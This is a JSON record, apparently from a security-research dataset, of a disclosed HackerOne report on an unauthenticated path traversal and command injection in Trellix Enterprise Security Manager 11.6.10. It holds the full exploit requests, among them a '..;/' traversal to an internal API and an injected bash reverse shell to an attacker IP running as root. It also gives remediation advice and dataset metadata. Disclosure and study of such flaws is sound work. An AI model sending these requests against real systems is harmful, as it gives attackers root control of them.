{
  "reported_to": "Trellix",
  "reported_by": "r4v ",
  "title": "Unauthenticated Path Traversal and Command Injection in Trellix Enterprise Security Manager 11.6.10",
  "content": "\nProduct: Trellix Enterprise Security Manager (ESM)\nVersion Tested: 11.6.10\nSource: Publicly available trial version from Trellix Trials \u2014 \"Trellix Enterprise Security Manager, Event Receiver & Log Manager VM for SIEM v11.6.10.\"\nPotentially Affected Versions: Latest version could also be vulnerable\nVulnerability Type: Path Traversal, Command Injection\nSeverity: Critical\n\nSummary:\nA critical vulnerability in Trellix Enterprise Security Manager (ESM) version 11.6.10 allows unauthenticated access to the internal Snowservice API and enables remote code execution through command injection, executed as the root user. This vulnerability results from multiple flaws in the application's design and configuration, including improper handling of path traversal, insecure forwarding to an AJP backend without adequate validation, and lack of authentication for accessing internal API endpoints.\nThe root cause lies in the way the ESM forwards requests to the AJP service using ProxyPass, specifically configured as:\nCode 46 Bytes\n1ProxyPass         /rs  ajp://localhost:8009/rs\nThis configuration permits unintended external access to internal paths by leveraging the ..;/ traversal sequence, which bypasses typical directory restrictions. This technique is further explained in Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out by Orange Tsai at Black Hat USA 2018 (source). The ..;/ sequence bypasses common path validation checks, making it possible to access restricted internal APIs. Combined with command injection vulnerabilities, this leads to a critical security risk.\n\nProduct reports - releases affected:\nWherever possible, please test against the latest released version.\nTested on Trellix Enterprise Security Manager version 11.6.10 (Linux)\nOther versions may also be affected (please verify)\n\nWebsite reports - browsers verified in:\nPlease provide the full URL.\nTested via HTTP requests (no specific browser required)\n\nSteps to reproduce:\nAccess the /rs/..;/Snowservice/SnowflexAdminServices/CreateNode endpoint without authentication to confirm unauthenticated access.\nSubmit a request to the CreateNode endpoint to verify unauthorized path traversal access to the internal API.\nExploit command injection via the ManageNode endpoint to execute commands with root privileges.\nStep 1: Unauthenticated API Access via Path Traversal\nThe following request demonstrates unauthenticated access to the internal API:\nRequest Example:\nCode 386 Bytes\n1POST /rs/..;/Snowservice/SnowflexAdminServices/CreateNode HTTP/1.0\n2Host: [ESM IP]\n3Accept: application/json\n4Content-Type: application/json\n5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36\n6Content-Length: 118\n7\n8{\n9    \"serverName\": \"test132\", \n10    \"ip\": \"127.0.0.1\",\n11    \"port\": \"1212\",\n12    \"peerPort\": \"1210\"\n13}\nStep 2: Remote Code Execution via Command Injection with Root Privileges\nThe following command injection payload in the name parameter provides remote root access:\nRequest Example:\nCode 466 Bytes\n1POST /rs/..;/Snowservice/SnowflexAdminServices/ManageNode HTTP/1.0\n2Host: [ESM IP]\n3Accept: application/json\n4Content-Type: application/json\n5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36\n6Content-Length: 186\n7\n8{\n9    \"serverName\": \"test132\",\n10    \"processes\": [\n11        {\n12            \"name\": \"`bash -i >& /dev/tcp/[Attacker IP]/2137 0>&1`\", \n13            \"signal\": \"Restart\"\n14        }\n15    ]\n16}\nThis payload opens a reverse shell to the attacker\u2019s machine, providing root access and full control over the system.\n\nSupporting material/references:\nScreenshot 1: screenshot.png - This screenshot shows the HTTP request used to exploit the command injection vulnerability and the reverse shell connection received by the attacker.\nScreenshot 2: screenshot2.png - This screenshot displays the process list on the compromised system, showing the injected command being executed as root. It also shows the whole command executed.\n\nImpact\nExploiting this vulnerability allows an attacker to:\nGain unauthenticated access to internal API endpoints through path traversal.\nExecute arbitrary commands as root, compromising the system entirely.\nThe impact of this vulnerability is rated Critical due to the combination of unauthenticated path traversal, insecure proxy forwarding, and command injection.\n\nRecommendations\nSecure AJP Proxy Configuration\nReview and restrict ProxyPass configurations. Ensure that internal paths are only accessible from trusted sources and prevent external access.\nAvoid using ambiguous path traversal characters like ..;/ by implementing additional path validation for all forwarded requests.\nReview and restrict ProxyPass configurations. Ensure that internal paths are only accessible from trusted sources and prevent external access.\nAvoid using ambiguous path traversal characters like ..;/ by implementing additional path validation for all forwarded requests.\nPath Validation and Access Control\nImplement robust path validation to reject sequences like ..;/ that enable unauthorized access.\nEnsure access controls are in place for internal APIs, blocking all unauthorized users and enforcing authentication.\nImplement robust path validation to reject sequences like ..;/ that enable unauthorized access.\nEnsure access controls are in place for internal APIs, blocking all unauthorized users and enforcing authentication.\nCommand Injection Prevention\nEnforce strict input sanitization, especially for sensitive parameters like name. Reject special characters and command syntax in user inputs.\nImplement whitelisting of acceptable commands and arguments to prevent arbitrary code execution.\nEnforce strict input sanitization, especially for sensitive parameters like name. Reject special characters and command syntax in user inputs.\nImplement whitelisting of acceptable commands and arguments to prevent arbitrary code execution.\nPrinciple of Least Privilege\nAvoid running the service as root to reduce potential damage if an exploit occurs.\nAvoid running the service as root to reduce potential damage if an exploit occurs.\n\nImpact Summary\nThis vulnerability in Trellix ESM 11.6.10 allows unauthenticated access to an internal API through path traversal enabled by insecure AJP forwarding and lacks input validation, permitting command injection with root execution. Confirmed on the publicly available trial version, this vulnerability likely affects other versions and requires urgent remediation.\n\nNote to Vendor\nIt is recommended that Trellix verify which versions of the software are affected by this vulnerability. This issue may not be limited to version 11.6.10 and could impact previous versions as well. A thorough review of historical versions is advised to assess the scope of this vulnerability and ensure proper patching across affected releases.\nThank you for reviewing this report. I am available for any further questions or additional information.\nBest Regards,\n\nRafal Gill (r4v)\n\n",
  "severity": [
    10.0,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "OS Command Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1736684520,
  "report_url": "https://hackerone.com/reports/2817658",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Access the /rs/..;/Snowservice/SnowflexAdminServices/CreateNode endpoint without authentication to confirm unauthenticated access."
    ],
    [
      2,
      "Submit a request to the CreateNode endpoint to verify unauthorized path traversal access to the internal API."
    ],
    [
      3,
      "Exploit command injection via the ManageNode endpoint to execute commands with root privileges."
    ]
  ],
  "vuln_description": "A critical vulnerability in Trellix Enterprise Security Manager (ESM) version 11.6.10 allows unauthenticated access to the internal Snowservice API and enables remote code execution through command injection, executed as the root user. This vulnerability results from multiple flaws in the application's design and configuration, including improper handling of path traversal, insecure forwarding to an AJP backend without adequate validation, and lack of authentication for accessing internal API endpoints.",
  "reason": "The attack involves multiple components (path traversal, command injection, AJP proxy misconfiguration) and requires understanding of subtle interactions between these components. The use of ..;/ for path traversal is a non-obvious technique that requires specific knowledge of AJP proxy behavior and path normalization bypasses.",
  "new_complexity": "HIGH",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The vulnerability involves unauthenticated access to an internal API through path traversal and command injection, which fits the methodology of testing for AuthN/AuthZ bypass by executing actions with an unauthenticated session (test d). The path traversal and command injection can be detected by analyzing the requests and responses for unauthorized access and execution of commands.",
    "is_detectable": true
  },
  "injection_metadata": {
    "reasoning": "The vulnerability involves path traversal (using `..;/` sequence) and command injection via API parameters. While the methodology might detect the command injection parameter (`name`) via parameter extraction, the path traversal bypass requires understanding non-standard URL normalization (Orange Tsai's research) and exploiting AJP misconfiguration. The `..;/` sequence is not a 'simple' payload in the described methodology's context, as it relies on parser logic flaws rather than generic encoding/context manipulation. Detection also requires observing out-of-band behavior (reverse shell) rather than same-channel responses.",
    "is_simple_injection": false
  }
}